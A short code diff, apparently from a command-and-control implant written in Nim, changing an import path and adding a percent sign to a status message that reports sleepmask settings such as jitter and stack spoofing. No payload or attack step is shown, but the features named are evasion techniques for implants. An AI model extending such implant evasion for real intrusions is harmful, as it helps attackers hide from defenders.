@@ -42,7 +42,7 @@ when not defined(agent):
 when defined(agent): 
 
     import os, strutils, strformat
-    import ../agent/core/io
+    import ../agent/utils/io
     import ../agent/protocol/result
     import ../common/utils
 
@@ -69,7 +69,7 @@ when defined(agent):
             case int(task.argCount): 
             of 0: 
                 # Retrieve sleepmask settings 
-                let response = fmt"Sleepmask settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
+                let response = fmt"Sleepmask settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
                 return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
 
             of 1: 
